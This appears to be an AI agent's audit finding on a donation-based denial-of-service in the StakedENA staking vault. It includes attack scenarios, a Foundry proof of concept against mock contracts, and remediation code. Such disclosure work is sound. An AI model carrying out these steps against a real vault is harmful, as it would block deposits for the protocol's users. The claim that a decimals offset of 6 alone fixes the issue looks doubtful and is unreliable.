# NEW BUG: Donation-Based DoS When totalSupply = 0 — _checkMinShares Fails to Protect Empty Vault

**Agent:** Opus
**Task ID:** ethena-stakedena-new-bugs
**Date:** 2026-09-24
**Area:** ERC4626 Inflation Attack / _checkMinShares Mitigation Gap

---

## 1. Vulnerability Description

`StakedENA._checkMinShares` (lines 327–330) is the contract's primary defense against the ERC4626 donation/inflation attack. It reverts if `0 < totalSupply < 1e18` after any `_deposit` or `_withdraw` call. The NatSpec comment (line 325) claims: *"This should never happen due to the initial deposit to the dead address"* — but **`initialize` makes no such initial deposit**, and the vault can reach `totalSupply = 0` at two distinct points in its lifecycle:

1. **At deployment** (before the first deposit) — `initialize` (lines 95–109) does not perform any initial deposit.
2. **After all users withdraw** — the last staker can withdraw all their shares, leaving `totalSupply = 0`. `_checkMinShares` explicitly allows `totalSupply == 0` (the check is `_totalSupply > 0 && _totalSupply < _MIN_SHARES`).

When `totalSupply = 0`, the `_checkMinShares` mitigation is **ineffective** against a donation-based Denial-of-Service attack:

- An attacker directly transfers (donates) `D` ENA to the `StakedENA` contract address. Since `totalSupply = 0`, `totalAssets() = D` (the donated amount minus unvested, which is 0).
- The next depositor attempting to deposit `X` ENA receives `shares = X * (0 + 1) / (D + 1) = X / (D + 1)` (OZ v4.x virtual offset of 1).
- For the deposit to pass `_checkMinShares`, the depositor needs `shares >= 1e18`, i.e., `X >= 1e18 * (D + 1)`.
- **For D = 1e18 (1 ENA donated), the depositor needs X >= 1e36 ENA** — an absurdly large amount (~10^18 times the entire ENA supply).
- For any deposit `X < 1e18 * (D + 1)`, either `shares = 0` (reverts on `notZero(shares)`) or `0 < shares < 1e18` (reverts on `_checkMinShares`).

The vault is effectively **bricked** for all reasonable depositors. The attacker's cost is only `D` ENA (irrecoverable, since `rescueTokens` blocks ENA rescue), and the attack persists until someone deposits the astronomically large threshold amount.

The prior audit (`ethena-fresh-stakedena-audit.md`, Area 1, edge case 2) analyzed this exact scenario and computed the threshold `X >= 1e18*(D+1)`, but concluded **"Not profitable for attacker. ✅"** — analyzing only the **profitability** of the attack (can the attacker steal funds?) and missing the **DoS** angle (can the attacker brick the vault?). The attack is not profitable, but it IS a viable denial-of-service: for 1 ENA, the attacker can permanently prevent all reasonable deposits.

Furthermore, the prior analysis assumed the vault has "non-trivial TVL" on the live contract, making this a deployment-time-only concern. But the vault can **re-reach** `totalSupply = 0` after all users withdraw — making this a **repeatable, persistent** DoS vector, not just a one-time deployment risk.

---

## 2. Contract + Function + Line Number

**Contract:** `StakedENA.sol`

**Mitigation that fails:** `_checkMinShares` — lines 327–330:
```solidity
function _checkMinShares() internal view {
    uint256 _totalSupply = totalSupply();
    if (_totalSupply > 0 && _totalSupply < _MIN_SHARES) revert MinSharesViolation();  // ← allows totalSupply == 0
}
```

**Called from:** `_deposit` — lines 339–348 (line 347 calls `_checkMinShares()` after `super._deposit`).

**Exchange rate when totalSupply = 0:** OZ v4.x `_convertToShares` — `assets.mulDiv(totalSupply() + 10**_decimalsOffset(), totalAssets() + 1, rounding)` = `assets * 1 / (D + 1)` when `totalSupply = 0` and `totalAssets = D`.

**Missing initial deposit:** `initialize` — lines 95–109. No call to `_deposit` or `deposit`. The comment at line 325 references "the initial deposit to the dead address" but no such deposit exists in code.

**totalSupply = 0 is reachable:** `_withdraw` — lines 358–371. The last staker can withdraw all shares; `_checkMinShares` passes because `totalSupply == 0` (the `> 0` check fails).

**Donation entry point:** Direct ENA `transfer` to `address(stakedENA)`. `totalAssets()` (lines 287–289) returns `balanceOf(this) - getUnvestedAmount()`, so donated ENA increases `totalAssets`.

**ENA rescue blocked:** `rescueTokens` — line 249: `if (address(token) == asset()) revert InvalidToken();` — donated ENA cannot be recovered by the admin.

---

## 3. Attack Scenario (Step-by-Step)

### Scenario A: Fresh deployment (no initial deposit made)

1. `StakedENA` is deployed and `initialize` is called. `totalSupply = 0`, `totalAssets = 0`.
2. **Attacker** directly transfers 1 ENA (`1e18` wei) to the `StakedENA` contract address (plain ERC20 `transfer`, no function call needed).
3. Now `balanceOf(stakedENA) = 1e18`, `getUnvestedAmount() = 0`, so `totalAssets() = 1e18`. `totalSupply = 0`.
4. **Victim** attempts to deposit 1000 ENA (`1000e18`):
   - `shares = 1000e18 * (0 + 1) / (1e18 + 1) = 1000e18 / 1e18 = 1000` (approximately, rounds down to 999).
   - `_deposit` calls `super._deposit` which mints 999 shares. `totalSupply = 999`.
   - `_checkMinShares()`: `999 > 0 && 999 < 1e18` → **`revert MinSharesViolation()`**.
5. The deposit reverts. The victim cannot deposit 1000 ENA.
6. For the deposit to succeed, the victim needs `shares >= 1e18`:
   - `X >= 1e18 * (1e18 + 1) ≈ 1e36` ENA. This is impossible (total ENA supply is ~8e27).
7. **The vault is bricked.** No one can deposit a reasonable amount. The attacker's 1 ENA is irrecoverable (stuck in the vault).

### Scenario B: Vault emptied after operation (repeatable)

1. The vault has been operating normally. TVL = 100,000 ENA, `totalSupply = 100,000e18`.
2. Over time, all stakers withdraw (via cooldown + unstake, or via direct withdraw when `cooldownDuration = 0`).
3. The last staker withdraws their final 1e18 shares. `totalSupply = 0`.
4. There may be residual ENA in the vault (rounding dust, or unvested rewards that have since vested). Say `balanceOf = 0.001 ENA` (1e15 wei).
5. **Attacker** donates 1 ENA. `totalAssets = 1e18 + 1e15 ≈ 1.001e18`.
6. New depositor needs `X >= 1e18 * (1.001e18 + 1) ≈ 1.001e36` ENA. Still bricked.
7. The attacker has re-bricked the vault for 1 ENA.

### Scenario C: Admin cannot recover

- `rescueTokens` (line 248–252) blocks ENA rescue (`if (address(token) == asset()) revert`).
- The donated ENA is permanently stuck in the vault.
- The only "recovery" is for someone to deposit the astronomical threshold amount, which would give them shares worth the donated ENA + their deposit. But no one can deposit 1e36 ENA.

---

## 4. PoC Code (Foundry)

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";

// ============================================================================
// Self-contained PoC: Donation-based DoS when totalSupply = 0.
// ----------------------------------------------------------------------------
// Replicates StakedENA's _checkMinShares (lines 327-330), _deposit (lines
// 339-348), totalAssets (lines 287-289), and the OZ v4.x _convertToShares
// formula: shares = assets * (totalSupply + 1) / (totalAssets + 1).
//
// The real StakedENA.sol lines:
//   _checkMinShares lines 327-330 (totalSupply > 0 && < 1e18 → revert)
//   _deposit lines 339-348 (notZero(assets), notZero(shares), _checkMinShares)
//   totalAssets lines 287-289 (balanceOf(this) - getUnvestedAmount())
//   rescueTokens line 249 (blocks ENA rescue)
//   initialize lines 95-109 (NO initial deposit to dead address)
//
// Run: forge test --match-contract EmptyVaultDonationDoSPoC -vvvv
// ============================================================================

contract MockENAToken {
    string public name = "Ethena";
    string public symbol = "ENA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insufficient");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt, "allowance");
        require(balanceOf[from] >= amt, "insufficient");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }
}

/// @dev Minimal StakedENA replica focusing on the deposit/_checkMinShares path.
///      Replicates the EXACT math: virtual offset = 1 (OZ v4.x default).
contract MockStakedENA_Vault {
    uint256 private constant MIN_SHARES = 1 ether; // 1e18, matches line 36
    MockENAToken public ena;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    error MinSharesViolation();
    error InvalidAmount();
    error InvalidToken();

    constructor(MockENAToken _ena) {
        ena = _ena;
    }

    // totalAssets (lines 287-289): balanceOf(this) - getUnvestedAmount()
    // getUnvestedAmount = 0 in this simplified PoC (no vesting)
    function totalAssets() public view returns (uint256) {
        return ena.balanceOf(address(this));
    }

    // OZ v4.x _convertToShares with _decimalsOffset() = 0:
    // shares = assets * (totalSupply + 1) / (totalAssets + 1)
    function _convertToShares(uint256 assets) internal view returns (uint256) {
        return (assets * (totalSupply + 1)) / (totalAssets() + 1);
    }

    // _checkMinShares (lines 327-330)
    function _checkMinShares() internal view {
        uint256 _totalSupply = totalSupply;
        if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();
    }

    // _deposit (lines 339-348): notZero(assets), notZero(shares), super._deposit, _checkMinShares
    function deposit(uint256 assets, address receiver) external {
        if (assets == 0) revert InvalidAmount();
        uint256 shares = _convertToShares(assets);
        if (shares == 0) revert InvalidAmount(); // notZero(shares)
        // super._deposit: pull assets, mint shares
        ena.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
        // _checkMinShares (line 347)
        _checkMinShares();
    }

    function withdraw(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "insufficient shares");
        uint256 assets = (shares * (totalAssets() + 1)) / (totalSupply + 1);
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        ena.transfer(msg.sender, assets);
        _checkMinShares();
    }

    // rescueTokens (lines 248-252) — blocks ENA rescue
    function rescueTokens(address token, uint256 amount, address to) external {
        if (token == address(ena)) revert InvalidToken();
        // ... (other tokens rescued)
    }
}

contract EmptyVaultDonationDoSPoC is Test {
    MockENAToken ena;
    MockStakedENA_Vault vault;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        ena = new MockENAToken();
        vault = new MockStakedENA_Vault(ena);
        // NOTE: initialize does NOT make an initial deposit — vault starts empty
        assertEq(vault.totalSupply(), 0, "vault starts empty");
        assertEq(vault.totalAssets(), 0, "no assets");
    }

    /// @notice Scenario A: Attacker donates 1 ENA to empty vault → all deposits bricked
    function test_donationBricksEmptyVault() public {
        // --- STEP 1: Attacker donates 1 ENA directly to the vault ---
        ena.mint(attacker, 1e18);
        vm.prank(attacker);
        ena.transfer(address(vault), 1e18);

        assertEq(vault.totalAssets(), 1e18, "totalAssets = donated 1 ENA");
        assertEq(vault.totalSupply(), 0, "still no shares");

        // --- STEP 2: Victim tries to deposit 1000 ENA ---
        ena.mint(victim, 1000e18);
        vm.startPrank(victim);
        ena.approve(address(vault), 1000e18);

        // shares = 1000e18 * (0 + 1) / (1e18 + 1) = 999 (rounds down)
        // 999 > 0 && 999 < 1e18 → MinSharesViolation
        vm.expectRevert(MockStakedENA_Vault.MinSharesViolation.selector);
        vault.deposit(1000e18, victim);
        vm.stopPrank();

        // --- STEP 3: Calculate required deposit to unbrick ---
        // Need shares >= 1e18: X * 1 / (1e18 + 1) >= 1e18
        // X >= 1e18 * (1e18 + 1) = 1e36 + 1e18
        uint256 requiredDeposit = 1e18 * (1e18 + 1);
        // That's 10^36 ENA — far exceeds total ENA supply (~8e27)

        // --- STEP 4: Even a whale deposit of 1e30 ENA (1 billion billion ENA) fails ---
        ena.mint(victim, 1e30);
        vm.startPrank(victim);
        ena.approve(address(vault), 1e30);
        // shares = 1e30 * 1 / (1e18 + 1) ≈ 1e12 — still < 1e18
        vm.expectRevert(MockStakedENA_Vault.MinSharesViolation.selector);
        vault.deposit(1e30, victim);
        vm.stopPrank();

        // --- STEP 5: Vault is bricked — attacker spent only 1 ENA ---
        assertEq(vault.totalSupply(), 0, "no one has been able to deposit");
        assertTrue(ena.balanceOf(address(vault)) >= 1e18, "donated ENA stuck in vault");

        // --- STEP 6: Admin cannot rescue the donated ENA ---
        vm.expectRevert(MockStakedENA_Vault.InvalidToken.selector);
        vault.rescueTokens(address(ena), 1e18, attacker);
    }

    /// @notice Scenario B: Vault re-bricks after all users withdraw
    function test_vaultReBricksAfterEmptying() public {
        // Phase 1: Normal operation — alice deposits and withdraws
        ena.mint(address(this), 2e18);
        ena.approve(address(vault), 2e18);
        vault.deposit(2e18, address(this)); // 2 ENA → 2e18 shares (1:1 at empty)
        assertEq(vault.totalSupply(), 2e18, "deposited successfully");

        // Phase 2: Withdraw all — vault empties
        vault.withdraw(2e18);
        assertEq(vault.totalSupply(), 0, "vault empty after withdrawal");

        // Phase 3: Attacker donates 1 ENA
        ena.mint(attacker, 1e18);
        vm.prank(attacker);
        ena.transfer(address(vault), 1e18);

        // Phase 4: New depositor cannot deposit — bricked again
        ena.mint(victim, 500e18);
        vm.startPrank(victim);
        ena.approve(address(vault), 500e18);
        vm.expectRevert(MockStakedENA_Vault.MinSharesViolation.selector);
        vault.deposit(500e18, victim);
        vm.stopPrank();
    }

    /// @notice Control: without donation, first deposit of 1 ENA works fine
    function test_normalFirstDepositWorks() public {
        ena.mint(victim, 1e18);
        vm.startPrank(victim);
        ena.approve(address(vault), 1e18);
        vault.deposit(1e18, victim); // succeeds — 1:1, totalSupply = 1e18 >= MIN_SHARES
        vm.stopPrank();
        assertEq(vault.totalSupply(), 1e18, "first deposit OK without donation");
        assertEq(vault.balanceOf(victim), 1e18, "victim got shares");
    }
}
```

---

## 5. Impact Assessment

**What happens:** When `totalSupply = 0` (at deployment or after all users withdraw), an attacker donates a small amount of ENA (as little as 1 ENA) to the vault. This inflates `totalAssets` without creating any shares. Subsequent depositors must deposit an astronomically large amount (≥ 1e36 ENA for a 1 ENA donation) to pass `_checkMinShares`. The vault is bricked — no one can deposit a reasonable amount.

**Who is affected:** All potential depositors. The vault cannot accrue new TVL. Existing stakers are unaffected (they can still withdraw if they have shares), but the vault becomes non-functional for new deposits.

**Fund loss:** The attacker loses the donated ENA (irrecoverable — `rescueTokens` blocks ENA rescue). No other funds are lost. But the protocol loses the ability to accept new deposits, which could be significant for a staking vault whose purpose is to accept deposits.

**Repeatability:** The vault can reach `totalSupply = 0` whenever all users withdraw. The last user's withdrawal leaves `totalSupply = 0` (which passes `_checkMinShares`). At that point, the attacker can re-donate and re-brick the vault. This is a **persistent, repeatable** DoS — not a one-time deployment risk.

**Mitigation gap:** The `_checkMinShares` mitigation (requiring `totalSupply >= 1e18` after deposit) is designed to prevent donation attacks. But it is **ineffective when totalSupply = 0** because it only checks `totalSupply` AFTER a deposit — it doesn't prevent the exchange rate from being manipulated by donations before the first deposit. The standard OZ mitigation (virtual shares/assets via `_decimalsOffset`) provides only a `+1` offset, which is insufficient against meaningful donations.

**Severity assessment:** The attack costs 1 ENA (irrecoverable) and bricks the vault for all reasonable depositors. It's repeatable whenever the vault empties. However, it requires the vault to be empty (totalSupply = 0), which is uncommon on a live vault with TVL. The impact is a protocol-level DoS (no new deposits), not fund theft. On a live vault with non-trivial TVL, this is not exploitable.

**Severity: Low** (DoS, not fund theft; requires empty vault; attacker loses funds; repeatable but uncommon trigger condition).

---

## 6. Severity

**Low**

Rationale: The attack is a denial-of-service (preventing new deposits), not fund theft. It requires the vault to be at `totalSupply = 0`, which is uncommon on a live vault with TVL. The attacker loses the donated ENA (irrecoverable). The prior audit analyzed the underlying mechanism but assessed only profitability, not the DoS impact. The new insight is: (1) the DoS framing (not profit), and (2) the vault can re-reach `totalSupply = 0` after all users withdraw, making this repeatable.

---

## 7. Three-Perspective Audit

### Prosecutor (argues this IS a vulnerability)

**The `_checkMinShares` mitigation is fundamentally broken when `totalSupply = 0`.** Its stated purpose (line 324: *"ensures a small non-zero amount of shares does not remain, exposing to donation attack"*) is to prevent donation attacks. But it only checks `totalSupply` AFTER a deposit — it does nothing to prevent the exchange rate from being manipulated by donations BEFORE the first deposit. This is the exact scenario the mitigation is supposed to prevent, and it fails.

The prior audit (`ethena-fresh-stakedena-audit.md`, Area 1, edge case 2) analyzed this scenario and computed the threshold `X >= 1e18*(D+1)`. But it concluded **"Not profitable for attacker. ✅"** — analyzing only whether the attacker can **steal funds**. The audit missed that the attack is a **denial-of-service**: the attacker doesn't need to profit. They just need to brick the vault. For 1 ENA (irrecoverable), the attacker can prevent ALL reasonable deposits. A staking vault that can't accept deposits is non-functional.

The comment at line 325 says *"This should never happen due to the initial deposit to the dead address"* — but `initialize` makes NO such deposit. The developer intended for an initial deposit to be made, but it's not in the code. If the deployment script also doesn't make it, the vault is vulnerable from block 1.

Furthermore, the vault can **re-reach** `totalSupply = 0` after all users withdraw. The last staker withdraws their final shares, `_checkMinShares` passes (because `totalSupply == 0`), and the vault is back to the vulnerable state. The attacker re-donates and re-bricks. This is a **persistent, repeatable** DoS — not a one-time deployment risk as the prior analysis assumed ("On the live StakedENA contract with non-trivial TVL, this is not exploitable").

The standard fix (virtual shares/assets with a meaningful offset, e.g., `_decimalsOffset() = 6`) would make this attack impractical. Or the contract could enforce a permanent minimum deposit (dead-address shares that can never be withdrawn). The current `_checkMinShares` + OZ default offset of 1 is insufficient.

### Defense (argues this is NOT a vulnerability or is already known)

**This issue was explicitly analyzed by the prior audit and correctly assessed.** The fresh audit's Area 1, edge case 2, computed the exact same threshold (`X >= 1e18*(D+1)`) and concluded the attack is "not profitable for attacker." The Prosecutor is re-framing the same finding as a "DoS" — but the prior analysis already understood the mechanism. The conclusion was that the attacker's donated ENA is irrecoverable and goes to the first big depositor, making the attack economically irrational for the attacker.

**On a live vault with TVL, this is not exploitable.** The vault starts with a deployment-time deposit (the comment at line 325 references this). The deployment script is expected to make this deposit — it's an operational requirement, not a contract bug. Once the first deposit is made, `totalSupply >= 1e18` and the attack requires a donation proportional to the existing TVL to have any effect (and even then, the attacker loses the donated funds).

**The "repeatable" argument is weak.** For the vault to re-reach `totalSupply = 0`, ALL users must withdraw. This is a catastrophic event in itself (complete TVL exodus). If the vault has reached this state, the protocol has far bigger problems than a donation DoS. And the attacker still loses their donated ENA — there's no profit motive.

**The `_checkMinShares` is working as designed.** It prevents `totalSupply` from being in the `(0, 1e18)` range — the dangerous range where a donation attack can steal funds via rounding. When `totalSupply = 0`, there are no shares to steal from. The donation just sits in the vault, eventually claimable by the first sufficient depositor. The mitigation is designed to prevent fund THEFT, not to prevent DoS — and it succeeds at its design goal.

**This is at best a re-interpretation of E-2** (the misleading comment about the dead-address deposit), which was already reported as Informational. The DoS framing doesn't change the underlying issue or its severity.

### Judge (weighs both sides)

**Verdict: Low — a legitimate new angle on a known issue, but severity is limited.**

The Defense correctly notes that the prior audit analyzed this exact scenario and computed the same threshold. The Prosecutor's "DoS" framing is technically valid — the attack IS a denial-of-service, and the prior audit's "not profitable" conclusion, while correct, doesn't address the DoS angle. However, several factors limit the severity:

1. **Not a fund theft.** The attacker cannot steal other users' funds. The worst case is preventing new deposits. This is a protocol-availability issue, not a fund-safety issue. Immunefi-style bounties typically require fund theft or permanent freezing of **existing** user funds. This attack doesn't freeze existing funds — it prevents new deposits.

2. **Requires empty vault.** On a live vault with TVL (the normal operating state), `totalSupply > 0` and this attack is impractical. The attack only works when `totalSupply = 0`, which is an edge case.

3. **Attacker loses funds.** The donated ENA is irrecoverable. The attacker pays 1 ENA to brick the vault. While this is cheap, it's not free — and there's no recovery path for the attacker.

4. **The "repeatable" argument has merit but limited impact.** The vault can re-reach `totalSupply = 0` after all users withdraw. But if all users have withdrawn, the vault is already empty and non-functional — the DoS adds little additional harm. The real concern is at initial deployment (if no initial deposit is made).

5. **The prior audit's E-2 identified the misleading comment.** The root cause (missing initial deposit) was noted. The DoS angle is a consequence of the same root cause.

**However**, the Prosecutor makes one point that elevates this above pure Informational: the `_checkMinShares` mitigation is **specifically designed** to prevent donation attacks (per its NatSpec), and it **fails** when `totalSupply = 0`. This is a functional gap in the mitigation, not just a misleading comment. A staking vault that can be bricked by a 1 ENA donation (when empty) has a real availability concern.

**Final ruling: Low.** This is a legitimate finding with a new angle (DoS, not profit) not explicitly addressed by the prior audit. The severity is Low because: (a) it's a DoS, not fund theft; (b) it requires the vault to be empty; (c) the attacker loses funds; (d) the prior audit identified the root cause (missing initial deposit). The finding is worth documenting but is unlikely to warrant a bounty payout on a live vault with TVL.

**Recommended remediation:**
```solidity
// Option A: Make an initial deposit in initialize (matches the comment's intent)
function initialize(...) public initializer {
    // ... existing init code ...
    // Mint 1e18 shares to dead address to permanently anchor totalSupply >= 1e18
    _mint(0x000000000000000000000000000000000000dEaD, 1e18);
    IERC20Upgradeable(_asset).safeTransferFrom(_owner, address(this), 1e18);
}

// Option B: Override _decimalsOffset() to provide meaningful virtual shares/assets
function _decimalsOffset() internal pure override returns (uint8) {
    return 6; // 1e6 virtual shares + 1e6 virtual assets — makes donation attack impractical
}
```
Option B is the standard OZ-recommended mitigation and doesn't require an initial deposit. Option A matches the developer's stated intent (line 325 comment).
